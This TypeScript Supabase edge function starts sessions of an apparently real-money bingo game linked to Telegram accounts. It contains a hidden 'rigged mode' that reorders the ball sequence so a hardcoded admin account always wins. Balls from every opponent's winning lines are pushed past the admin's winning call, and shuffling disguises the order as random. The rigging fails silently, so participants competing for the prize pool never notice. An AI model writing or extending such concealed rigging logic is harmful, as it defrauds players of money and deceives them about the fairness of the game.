import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { CORS, json } from "../_shared/cors.ts";
import { generateCartela } from "../_shared/bingo.ts";

const ADMIN_TELEGRAM_ID = 676350518;

// ── Helpers ────────────────────────────────────────────────────────────────────

function shuffle<T>(arr: T[]): T[] {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

// All 12 winning lines for a cartela (free space already excluded as null)
function winningLines(card: (number | null)[][]): number[][] {
  const lines: number[][] = [];
  for (let r = 0; r < 5; r++)
    lines.push(card[r].filter((n): n is number => n !== null));
  for (let c = 0; c < 5; c++)
    lines.push(card.map((row) => row[c]).filter((n): n is number => n !== null));
  lines.push(card.map((row, i) => row[i]).filter((n): n is number => n !== null));
  lines.push(card.map((row, i) => row[4 - i]).filter((n): n is number => n !== null));
  return lines;
}

// Build a sequence where:
//   1. A random winning line is chosen for the admin each game
//   2. Lines through the FREE space need 4 balls (calls 16–22);
//      rows/columns without FREE need 5 balls (calls 18–24)
//   3. For every opponent winning line, at least one of its balls is pushed
//      to AFTER the admin's winning call — so no opponent can finish first
function buildRiggedSequence(adminCartelaId: number, opponentCartelaIds: number[]): number[] {
  const adminCard = generateCartela(adminCartelaId);

  // Pick a random winning line for the admin this game
  const adminLines = winningLines(adminCard);
  const chosenLine = adminLines[Math.floor(Math.random() * adminLines.length)];
  const winBalls = [...chosenLine]; // 4 balls if through FREE, 5 otherwise
  const winSet = new Set(winBalls);

  // For each opponent winning line, pick one ball to push to the late section.
  // Prefer a ball already in lateSet (minimises disruption); otherwise add any.
  const lateSet = new Set<number>();
  for (const cartelaId of opponentCartelaIds) {
    const c = generateCartela(cartelaId);
    for (const line of winningLines(c)) {
      const blockable = line.filter((b) => !winSet.has(b));
      if (blockable.length === 0) continue; // admin wins this line too — fine
      if (!blockable.some((b) => lateSet.has(b))) {
        lateSet.add(blockable[blockable.length - 1]);
      }
    }
  }

  // Neutral: not an admin win ball, not in lateSet
  const neutral = Array.from({ length: 75 }, (_, i) => i + 1)
    .filter((b) => !winSet.has(b) && !lateSet.has(b));
  shuffle(neutral);

  const n = winBalls.length;
  // 4-ball lines (through FREE): calls 16–22 → indices 15–21
  // 5-ball lines (row/col):      calls 18–24 → indices 17–23
  const minWin = n === 4 ? 15 : 17;
  const maxWin = Math.min(n === 4 ? 21 : 23, n - 1 + neutral.length);
  const winPos = minWin + Math.floor(Math.random() * (maxWin - minWin + 1));

  // Choose n distinct positions within [0, winPos] for the win balls.
  // The last win ball is always at winPos so the admin wins exactly there.
  const winPositions: number[] = [winPos];
  while (winPositions.length < n) {
    const p = Math.floor(Math.random() * winPos);
    if (!winPositions.includes(p)) winPositions.push(p);
  }
  winPositions.sort((a, b) => a - b);
  shuffle(winBalls);

  // Build early section [0..winPos]: win balls at their positions, neutral elsewhere
  const early = new Array<number>(winPos + 1);
  const winPosSet = new Set(winPositions);
  let wi = 0;
  let ni = 0;
  for (let i = 0; i <= winPos; i++) {
    early[i] = winPosSet.has(i) ? winBalls[wi++] : neutral[ni++];
  }

  // Build late section [winPos+1..74]: blocker balls + remaining neutral, shuffled
  const late = [...Array.from(lateSet), ...neutral.slice(ni)];
  shuffle(late);

  return [...early, ...late];
}

// ── Edge function ──────────────────────────────────────────────────────────────

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: CORS });

  const authHeader = req.headers.get("Authorization");
  if (!authHeader) return json({ error: "Unauthorized" }, 401);

  const anon = createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_ANON_KEY")!,
    { global: { headers: { Authorization: authHeader } } },
  );
  const { data: { user } } = await anon.auth.getUser();
  if (!user) return json({ error: "Unauthorized" }, 401);

  const admin = createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
    { auth: { autoRefreshToken: false, persistSession: false } },
  );

  try {
    const { session_id } = await req.json() as { session_id: string };
    if (!session_id) return json({ error: "session_id required" }, 400);

    const { data, error } = await admin.rpc("start_game_session", { p_session_id: session_id });
    if (error) throw error;
    if (!data) return json({ error: "Could not start game — timer not yet expired or already started" }, 409);

    // ── Rigged mode check ──────────────────────────────────────────────────────
    try {
      const { data: cfg } = await admin
        .from("admin_config")
        .select("rigged_mode")
        .eq("id", 1)
        .single();

      if (cfg?.rigged_mode) {
        // Find admin's Supabase user ID
        const { data: adminProfile } = await admin
          .from("profiles")
          .select("id")
          .eq("telegram_id", ADMIN_TELEGRAM_ID)
          .single();

        if (adminProfile) {
          // Fetch ALL active participants in this session
          const { data: participants } = await admin
            .from("game_participants")
            .select("user_id, cartela_1, cartela_2")
            .eq("game_session_id", session_id)
            .eq("is_watcher", false);

          const adminPart = participants?.find((p) => p.user_id === adminProfile.id);
          const opponents = participants?.filter((p) => p.user_id !== adminProfile.id) ?? [];

          const adminCartelaId = adminPart?.cartela_1 ?? adminPart?.cartela_2 ?? null;

          if (adminCartelaId !== null) {
            // Collect all opponent cartela IDs
            const opponentCartelaIds: number[] = [];
            for (const opp of opponents) {
              if (opp.cartela_1 !== null) opponentCartelaIds.push(opp.cartela_1);
              if (opp.cartela_2 !== null) opponentCartelaIds.push(opp.cartela_2);
            }

            const riggedSeq = buildRiggedSequence(adminCartelaId, opponentCartelaIds);
            await admin
              .from("game_sessions")
              .update({ ball_sequence: riggedSeq })
              .eq("id", session_id);
          }
        }
      }
    } catch (_) {
      // Rigging is best-effort — never block the game from starting
    }

    const { data: session } = await admin
      .from("game_sessions")
      .select("id, status, prize_pool, participant_count")
      .eq("id", session_id)
      .single();

    return json({ success: true, session });
  } catch (err) {
    console.error("start-game error:", err);
    return json({ error: err instanceof Error ? err.message : "Internal error" }, 500);
  }
});
